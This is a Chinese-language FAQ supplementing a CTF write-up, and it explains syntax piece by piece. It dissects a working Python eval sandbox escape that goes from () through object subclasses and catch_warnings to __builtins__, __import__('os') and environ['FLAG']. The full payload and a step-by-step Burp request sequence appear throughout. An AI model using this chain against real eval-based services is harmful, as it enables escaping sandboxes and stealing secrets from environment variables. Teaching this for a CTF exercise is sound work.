# Python 沙箱逃逸 Payload 语法拆解 FAQ

> 本文档是 [putcCTF - Lorem Ipsum Arcanum Invocatum Writeup](putcCTF_Lorem_Ipsum_Arcanum_Invocatum.md) 的知识补充，专门解释最终 payload 为什么要这样构造，以及每一段 Python 语法分别在做什么。

---

## 阅读前提：先把这条 payload 当成“连续取值链”

很多人第一次看到这类 payload 会觉得它像“乱码”，本质原因不是逻辑太难，而是它把很多小动作压缩进了一行。

建议把它当成下面这类连续链条去读：

```python
对象 -> 取属性 -> 取属性 -> 调用方法 -> 列表筛选 -> 取第一个 -> 实例化 -> 取属性 -> 字典取值 -> 调用函数 -> 取属性 -> 字典取值
```

也就是说，这类 payload 不是“一次完成了一个神秘操作”，而是把很多普通 Python 语法首尾连接起来了。

阅读时最稳妥的方法是：

1. 先找最左边的起点对象
2. 看它后面每一个 `.`、`()`、`[]` 各做了什么
3. 每走一步，都问一句“这一步现在返回的是什么对象”
4. 用返回的新对象继续往右读

只要你能一直回答“当前这一小段的结果是什么”，这类 payload 就不会看丢。

---

## 先看最终 payload

```python
[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ['FLAG']
```

如果把它拆成更容易阅读的多行逻辑，本质上等价于：

```python
subs = (()).__class__.__base__.__subclasses__()
target = [x for x in subs if x.__name__ == 'catch_warnings'][0]
inst = target()
builtins_obj = inst._module.__builtins__
os_mod = builtins_obj['__import__']('os')
flag = os_mod.environ['FLAG']
```

题目的关键限制是：
- `globals`、`__import__` 这些名字被移除了
- 但对象关系链还在

所以 payload 的总体思路不是“直接调用危险函数”，而是：

1. 先从一个普通对象出发
2. 沿属性链走到 `object`
3. 枚举所有子类
4. 找到可利用类 `catch_warnings`
5. 借这个类重新拿回 `__builtins__`
6. 再用 `__import__` 导入 `os`
7. 最后读 `os.environ['FLAG']`

---

## 图示版：把 payload 画成对象链

先看最直观的对象流向图：

```text
()
│
├─ __class__
│  ↓
│  tuple
│
├─ __base__
│  ↓
│  object
│
├─ __subclasses__()
│  ↓
│  [很多已加载类]
│
├─ [x for x in ... if x.__name__ == 'catch_warnings']
│  ↓
│  [catch_warnings 类]
│
├─ [0]
│  ↓
│  catch_warnings 类
│
├─ ()
│  ↓
│  catch_warnings 实例
│
├─ ._module
│  ↓
│  _py_warnings 模块
│
├─ .__builtins__
│  ↓
│  builtins 字典
│
├─ ['__import__']
│  ↓
│  __import__ 函数
│
├─ ('os')
│  ↓
│  os 模块
│
├─ .environ
│  ↓
│  环境变量字典
│
└─ ['FLAG']
   ↓
   putcCTF{Y0UR3_4_W1Z4RD_H4RRY}
```

如果把它压缩成一句话，就是：

```text
普通对象 -> 类型系统 -> object -> 所有子类 -> 目标 gadget -> 模块 -> builtins -> import -> os -> environ -> FLAG
```

---

## 图示版：把 payload 画成“语法动作流”

上一个图强调“对象怎么变”，这个图强调“语法上到底做了什么动作”。

```text
起点对象
  ↓
属性访问        (.__class__)
  ↓
属性访问        (.__base__)
  ↓
方法调用        (.__subclasses__())
  ↓
列表推导式筛选  ([x for x in ... if ...])
  ↓
列表索引        ([0])
  ↓
类调用/实例化   (())
  ↓
属性访问        (._module)
  ↓
属性访问        (.__builtins__)
  ↓
字典取值        (['__import__'])
  ↓
函数调用        (('os'))
  ↓
属性访问        (.environ)
  ↓
字典取值        (['FLAG'])
  ↓
最终结果
```

这个“动作流”特别适合卡住时自查：

- 如果你看不懂某一段，先判断它是 `.`、`()` 还是 `[]`
- 再问自己：这是属性访问、函数调用，还是索引/按键取值

只要动作认清了，整条链就不会乱。

---

## 图示版：拆成三层思维导图

把题目的利用过程按功能分层，可以记成下面三段：

```text
第一层：找入口
  - 从 () 出发
  - 通过 __class__ 找到 tuple
  - 通过 __base__ 找到 object
  - 通过 __subclasses__() 枚举所有子类

第二层：找 gadget
  - 用列表推导式筛类名
  - 找到 catch_warnings
  - 取第一个结果 [0]
  - 实例化成对象 ()

第三层：拿能力
  - 从实例拿到 _module
  - 从模块拿到 __builtins__
  - 从 builtins 恢复 __import__
  - 导入 os
  - 读取 environ['FLAG']
```

如果你是第一次做这类题，可以只记住这三层：

1. 先走到 `object`
2. 再找一个能回连模块或全局命名空间的 gadget
3. 最后恢复危险能力并读取敏感数据

---

## 图示版：为什么这题不是“直接 RCE”，而是“先恢复能力”？

这题的 payload 很容易让人误以为是在直接执行危险函数，其实中间多了一层“能力恢复”。

```text
题目原始状态
  ↓
没有 globals
没有 __import__
没有 open
  ↓
但对象链还在
  ↓
通过对象链找到 gadget
  ↓
通过 gadget 找回 __builtins__
  ↓
从 __builtins__ 里恢复 __import__
  ↓
现在才重新获得导入模块的能力
  ↓
导入 os
  ↓
读取 environ['FLAG']
```

所以这条 payload 的本质不是：

```text
我一开始就有危险函数
```

而是：

```text
我先从普通对象出发，绕路把危险函数重新找回来
```

---

## Burp Repeater 步骤与对象链阶段对照表

如果你是边看 Burp Repeater 边学 payload，这个对照表最实用。左边是你在 Repeater 里实际发的 `code=`，右边是这一小步在对象链里到底推进了什么。

| Burp 中发出的 `code=` | 当前验证目标 | 对象链推进到哪一步 | 预期结果 |
|------|------|------|------|
| `1%2B1` | 确认输入会被当表达式求值 | 还没进入对象链，只是在验证入口 | `2` |
| `().__class__` | 确认属性访问可行 | `对象 -> 类` | `<class 'tuple'>` |
| `globals()` | 确认危险名字被删掉 | 说明不能直接走名字，只能走对象链 | `name 'globals' is not defined` |
| `().__class__.__base__` | 确认能走到顶层父类 | `tuple -> object` | `<class 'object'>` |
| `[x.__name__ for x in (()).__class__.__base__.__subclasses__() if 'warning' in x.__name__.lower()]` | 确认能枚举并筛选子类 | `object -> 所有子类 -> 按名字筛选` | 包含 `catch_warnings` |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]` | 确认能精确取到目标类 | `候选类列表 -> 目标类对象` | `<class '_py_warnings.catch_warnings'>` |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()` | 确认目标类可实例化 | `类对象 -> 实例对象` | `catch_warnings` 实例 |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module` | 确认实例能回连模块 | `实例 -> 模块对象` | `_py_warnings` 模块 |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__` | 确认能取回 builtins | `模块 -> builtins` | 包含 `__import__`、`open` |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']` | 确认危险函数已恢复 | `builtins -> __import__ 函数` | `<built-in function __import__>` |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os')` | 确认可导入模块 | `__import__ -> os 模块` | `<module 'os' ...>` |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ` | 确认敏感数据在环境变量里 | `os -> environ` | 包含 `FLAG` |
| `[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ['FLAG']` | 最终取值 | `environ -> FLAG` | `putcCTF{...}` |

这个表想传达的重点是：

- 你在 Burp 里并不是“蒙一个超长 payload”
- 而是在做一串可以逐步验证的小跳转
- 每个请求都只比前一步多走一点点
- 所以一旦报错，你很容易知道是哪一跳出了问题

---

## 图示版：把 Burp 请求过程画成调试路线

可以把 Burp Repeater 的操作理解成下面这条“逐步探路”的路线：

```text
Step 1  试 1+1
  ↓
确认：后端确实在算表达式

Step 2  试 ().__class__
  ↓
确认：属性访问没被禁

Step 3  试 globals()
  ↓
确认：危险名字被删了
结论：不能靠名字，只能靠对象链

Step 4  试 ().__class__.__base__
  ↓
确认：能走到 object

Step 5  试 object.__subclasses__() 的筛选表达式
  ↓
确认：能枚举类，并找到 catch_warnings

Step 6  试 [0]()
  ↓
确认：目标类能实例化

Step 7  试 ._module.__builtins__
  ↓
确认：能恢复 builtins

Step 8  试 ['__import__']('os')
  ↓
确认：恢复 import 能力

Step 9  试 .environ
  ↓
确认：FLAG 在环境变量里

Step 10  试 ['FLAG']
  ↓
拿到最终 flag
```

如果你做题时觉得最终 payload 太长，可以完全不去背整条，而是只记住这 10 步调试路线。

---

## 先记住 5 个最常用语法块

这题其实几乎只用到了 5 种 Python 语法。

### 1. 属性访问：`a.b`

```python
obj.attr
```

意思是“取对象 `obj` 的属性 `attr`”。

比如：

```python
().__class__
```

意思就是取空元组对象的 `__class__` 属性。

### 2. 函数或方法调用：`f()`

```python
func()
func(arg)
```

意思是调用函数。

比如：

```python
target()
```

意思是调用类对象 `target`，创建实例。

### 3. 列表推导式：`[x for x in ... if ...]`

```python
[x for x in items if cond(x)]
```

意思是“遍历 `items`，筛出满足条件的元素，组成新列表”。

### 4. 索引或按键取值：`a[...]`

```python
lst[0]
mapping['FLAG']
```

意思取决于左边对象的类型：

- 如果左边是列表/元组，就是按位置取值
- 如果左边是字典，就是按键取值

### 5. 链式拼接：`a.b()[0].c['k']`

Python 允许把上面几种操作连续写在一起。每一步都会返回一个新对象，下一步就接着作用在这个新对象上。

这也是整个 payload 看起来长、但实际上可拆的原因。

---

## 一个最小练习：怎么从左到右读？

先不要看题目的 payload，先看一个更短的例子：

```python
'abc'.upper()[0]
```

可以拆成：

```python
'abc'           # 字符串对象
'abc'.upper()   # 调用字符串方法，得到 'ABC'
'abc'.upper()[0]  # 取第一个字符，得到 'A'
```

题目的 payload 也是同样的读法，只是对象变成了：

- 元组对象
- 类对象
- 类列表
- `catch_warnings` 类
- 模块对象
- builtins 字典
- `os` 模块
- 环境变量字典

所以一定不要一口气把整行硬啃完，而是要像调试器一样一段一段往右走。

---

## Q0：为什么这题里的 payload 必须写成“一条表达式”？

因为题目后端大概率用的是：

```python
eval(user_input)
```

而 `eval` 只能接受表达式，不能直接执行普通语句。

### 表达式和语句的区别

**表达式**会产生一个值，例如：

```python
1 + 1
'abc'.upper()
os.environ['FLAG']
```

这些都能算出一个结果，所以可以放进 `eval`。

**语句**主要是“做一件事”，不一定直接产生值，例如：

```python
x = 1
import os
for i in [1, 2, 3]:
    print(i)
```

这些通常不能直接丢给 `eval`。

所以攻击者必须把多步逻辑压缩成：

- 属性访问
- 函数调用
- 列表推导式
- 索引取值

这些都属于表达式，能连成一条。

---

## Q1：为什么 payload 要从 `()` 或 `(())` 这种普通对象开始？

因为题目删掉的是“名字”，不是“对象本身”。

就算你拿不到 `object` 这个名字，也仍然可以从一个已经存在的对象往上走：

```python
()
```

这是一个空元组对象。对它来说：

```python
().__class__
```

表示“这个对象的类是什么”，结果是：

```python
<class 'tuple'>
```

再往上一层：

```python
().__class__.__base__
```

表示“`tuple` 的父类是什么”，结果就是：

```python
<class 'object'>
```

所以 `()` 只是一个跳板。我们不是想要元组本身，而是借它摸到 Python 的类型系统。

---

## Q2：`().__class__.__base__.__subclasses__()` 到底是什么意思？

这是一串连续的属性访问和方法调用，可以拆成四步：

```python
()                      # 一个空元组对象
().__class__            # tuple
().__class__.__base__   # object
().__class__.__base__.__subclasses__()  # object 的所有子类
```

这里几种语法的含义分别是：

- `a.b`
  - 取对象 `a` 的属性 `b`
- `f()`
  - 调用函数或方法
- `__subclasses__()`
  - 返回某个类当前已加载的所有直接子类

所以：

```python
().__class__.__base__.__subclasses__()
```

拿到的是一个列表，里面装着当前 Python 运行时里很多类对象，例如：

- `type`
- `list`
- `dict`
- `WarningMessage`
- `catch_warnings`
- `Popen`

这一步非常关键，因为题目虽然删掉了危险名字，但没有阻止你遍历已经加载进内存的类。

---

## Q2.5：为什么这里经常有人把 `()` 和 `(())` 看混？

因为它们都合法，但含义不同：

```python
()     # 空元组
(())   # 里面装了一个空元组的元组
```

不过在这题里，这两个写法都能继续接 `.__class__`，都能最终走到 `object`，所以差别不影响利用。

比如：

```python
().__class__      # <class 'tuple'>
(()).__class__    # <class 'tuple'>
```

两者结果一样，都是 `tuple`。

所以这类 payload 里看到 `()` 或 `(())`，不要被外观吓到，关键是看它后面是不是用来取 `.__class__`。

---

## Q3：为什么中间要写成 `[x for x in ... if ...]` 这种形式？

因为这是一种列表推导式，用来“从一堆类里筛出目标类”。

原始写法：

```python
[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings']
```

可以读成：

```text
把 object 的所有子类遍历一遍，
每次取一个类记为 x，
如果 x.__name__ == 'catch_warnings'，
就把它放进最终列表里。
```

语法结构是：

```python
[表达式 for 变量 in 可迭代对象 if 条件]
```

在这里对应的是：

- 表达式: `x`
- 变量: `x`
- 可迭代对象: `object.__subclasses__()`
- 条件: `x.__name__ == 'catch_warnings'`

结果会是一个列表，通常像这样：

```python
[<class '_py_warnings.catch_warnings'>]
```

---

## Q3.5：列表推导式为什么比 `for` 循环更适合这里？

因为 `for` 循环是语句，不适合直接放进 `eval`：

```python
for x in items:
    ...
```

而列表推导式是表达式：

```python
[x for x in items if ...]
```

它会直接返回一个值，也就是一个列表，所以能自然接在后面的 `[0]` 上。

这就是为什么很多单表达式利用链都偏爱：

- 列表推导式
- 生成器表达式
- lambda

本质原因都是：它们比普通语句更适合塞进 `eval`。

---

## Q4：为什么后面要接 `[0]`？

因为前面的列表推导式返回的是“列表”，而后面我们要的是“里面那个类对象”。

例如：

```python
[<class '_py_warnings.catch_warnings'>]
```

这是一个只有一个元素的列表。加上 `[0]` 表示取第一个元素：

```python
[x for x in ... if x.__name__=='catch_warnings'][0]
```

得到的才是：

```python
<class '_py_warnings.catch_warnings'>
```

这里的 `[0]` 是 Python 的索引语法。

- `a[0]` 表示取序列第一个元素
- `a['key']` 表示取字典中键为 `'key'` 的值

这两个写法外观相似，但含义不同：

- 列表/元组里是“按位置取值”
- 字典里是“按键取值”

---

## Q4.5：为什么这里默认 `[0]` 是安全的？

严格来说，`[0]` 并不永远安全。如果筛选结果为空，会抛出索引错误。

但这题里通常先会用一个探测表达式确认：

```python
[x.__name__ for x in (()).__class__.__base__.__subclasses__() if 'warning' in x.__name__.lower()]
```

只要你已经看到返回里确实包含：

```text
catch_warnings
```

那后面的：

```python
[x for x in ... if x.__name__=='catch_warnings'][0]
```

就基本可以认为会取到目标。

---

## Q5：为什么类对象后面还要再接一个 `()`？

因为 `[0]` 取出来的是一个“类”，不是实例。

例如：

```python
target = [x for x in ... if x.__name__=='catch_warnings'][0]
```

这时的 `target` 是：

```python
<class '_py_warnings.catch_warnings'>
```

而：

```python
target()
```

表示“调用这个类，创建一个实例”。

所以 payload 里的这段：

```python
[...][0]()
```

意思是：

```text
先从子类列表里找出 catch_warnings 这个类，
然后立刻实例化它。
```

这样我们才能继续访问实例上的属性。

---

## Q5.5：怎么区分“我现在拿到的是类”还是“实例”？

有一个简单记忆法：

- 显示成 `<class '...'>` 的，多半还是类对象
- 真正调了 `()` 之后，才是实例

比如：

```python
[x for x in ... if x.__name__=='catch_warnings'][0]
```

拿到的是类。

而：

```python
[x for x in ... if x.__name__=='catch_warnings'][0]()
```

才是实例。

很多新手看不懂这段，通常就是因为没意识到中间发生了一次“类 -> 实例”的切换。

---

## Q6：为什么实例后面是 `._module.__builtins__`？

这是整个 payload 最核心的一跳。

`catch_warnings` 这个类之所以有利用价值，是因为它的实例能够关联回对应模块，而模块对象里通常能摸到 `__builtins__`。

这段：

```python
[...][0]()._module
```

拿到的是 `_py_warnings` 模块对象。

继续：

```python
[...][0]()._module.__builtins__
```

拿到 builtins。这里 `__builtins__` 可能表现为：

- 一个字典
- 或一个 builtins 模块对象

在这题里它表现为字典，所以后面才能写：

```python
['__import__']
```

也就是说，虽然题目把 `__import__` 这个名字从当前求值环境里删掉了，但它并没有把真正的 builtins 对象从运行时彻底隔离掉。

---

## Q6.5：`__builtins__` 为什么有时像字典，有时又像模块？

这是 Python 里一个常见的迷惑点。

在不同上下文里，`__builtins__` 可能表现为：

- builtins 模块
- 或 builtins 字典

这题里它表现得像字典，所以可以这样写：

```python
['__import__']
```

如果某些环境里它是模块对象，则更常见的写法会是：

```python
.__import__
```

所以以后做题时不要死记某一种固定写法，而要先看当前返回结果到底是什么结构。

---

## Q7：为什么是 `['__import__']('os')`，而不是直接 `__import__('os')`？

因为直接写：

```python
__import__('os')
```

会触发沙箱限制，报：

```text
name '__import__' is not defined
```

但如果你已经通过 `__builtins__` 拿到了一个字典，就可以从字典里按键取出这个函数：

```python
builtins_obj['__import__']
```

拿到的是函数对象。然后再立刻调用它：

```python
builtins_obj['__import__']('os')
```

这在语法上就是：

```python
字典取值 -> 得到函数 -> 立刻调用函数
```

拆开看就是：

```python
imp = builtins_obj['__import__']
os_mod = imp('os')
```

---

## Q7.5：`['__import__']('os')` 这种“连着写”在语法上合法吗？

完全合法。

因为：

```python
builtins_obj['__import__']
```

先返回一个函数对象。只要一个表达式最终返回的是“可调用对象”，你就能立刻在后面接 `()`：

```python
(某个返回函数的表达式)('os')
```

一个更简单的类比是：

```python
{'f': str.upper}['f']('abc')
```

这里也是：

1. 先从字典里取出函数
2. 再立刻调用这个函数

所以题目里的写法只是这个模式的延伸。

---

## Q8：为什么最后是 `.environ['FLAG']`？

因为导入 `os` 之后：

```python
os.environ
```

就是当前进程的环境变量映射，行为类似字典。

于是：

```python
os.environ['FLAG']
```

表示从环境变量里取键名为 `FLAG` 的值。

题目文案里的：

```text
the flame's surroundings
```

其实就在暗示“进程环境”这个思路。

所以最后这一段：

```python
['__import__']('os').environ['FLAG']
```

读起来就是：

```text
先导入 os，
再取进程环境变量，
最后读取 FLAG。
```

---

## Q9：这个 payload 每一段分别返回什么？

可以按下面顺序理解：

```python
(())
```

返回一个元组对象。

```python
(()).__class__
```

返回：

```python
<class 'tuple'>
```

```python
(()).__class__.__base__
```

返回：

```python
<class 'object'>
```

```python
(()).__class__.__base__.__subclasses__()
```

返回很多类组成的列表。

```python
[x for x in ... if x.__name__=='catch_warnings']
```

返回：

```python
[<class '_py_warnings.catch_warnings'>]
```

```python
[...][0]
```

返回：

```python
<class '_py_warnings.catch_warnings'>
```

```python
[...][0]()
```

返回一个 `catch_warnings` 实例。

```python
[...][0]()._module
```

返回 `_py_warnings` 模块对象。

```python
[...][0]()._module.__builtins__
```

返回 builtins 字典。

```python
[...][0]()._module.__builtins__['__import__']
```

返回 `__import__` 函数对象。

```python
[...][0]()._module.__builtins__['__import__']('os')
```

返回 `os` 模块。

```python
[...][0]()._module.__builtins__['__import__']('os').environ
```

返回环境变量映射。

```python
[...][0]()._module.__builtins__['__import__']('os').environ['FLAG']
```

返回最终 flag 字符串。

---

## Q10：如果我要自己手工构造，最稳的顺序是什么？

建议永远按“先短后长”的顺序试，不要一上来就拼最终 payload。

比较稳的构造流程是：

1. 先验证表达式被执行

```python
1+1
```

2. 再验证属性可访问

```python
().__class__
```

3. 再走到 `object`

```python
().__class__.__base__
```

4. 再枚举子类

```python
[x.__name__ for x in (()).__class__.__base__.__subclasses__()[:20]]
```

5. 再按名字筛出目标类

```python
[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings']
```

6. 再取实例、取模块、取 builtins

```python
[x for x in ... if x.__name__=='catch_warnings'][0]()._module.__builtins__
```

7. 最后才恢复 `__import__` 和读取环境变量

```python
...['__import__']('os').environ['FLAG']
```

这样做的好处是：每一步都可验证，一旦报错，很容易知道是从哪一步开始走偏了。

---

## Q11：这类 payload 最容易看晕的地方是什么？

最常见的误区有四个：

1. 把“属性访问”和“函数调用”混为一谈
   - `a.b` 是取属性
   - `a.b()` 是调用方法

2. 不区分“类”和“实例”
   - `[...][0]` 取出来的是类
   - `[...][0]()` 才是实例

3. 不区分“列表索引”和“字典取值”
   - `[0]` 是按位置取第一个元素
   - `['FLAG']` 是按键取字典值

4. 忽略这是单表达式环境
   - 很多初学者会想写成多行变量赋值
   - 但 `eval` 场景里必须把逻辑压成一整条表达式

---

## Q12：这条 payload 的“语法骨架”可以怎么记？

可以把它抽象成下面这个模板：

```python
[筛选目标类][0]().某个属性.某个属性['某个键']('某个模块').某个属性['某个键']
```

映射到本题就是：

```python
[x for x in object子类列表 if 名字等于catch_warnings][0]()
._module
.__builtins__
['__import__']
('os')
.environ
['FLAG']
```

如果你先记住这个骨架，再回头看原 payload，就会清楚很多：

- 前半段在“找 gadget”
- 中间在“取回 builtins”
- 后半段在“恢复 import 并取 flag”

---

## 一句话总结这个 payload 的构造逻辑

**从普通对象摸到 `object`，从 `object` 枚举子类，找到可回连模块的 gadget，借它取回 `__builtins__`，再恢复 `__import__` 导入 `os`，最后读取环境变量里的 `FLAG`。**
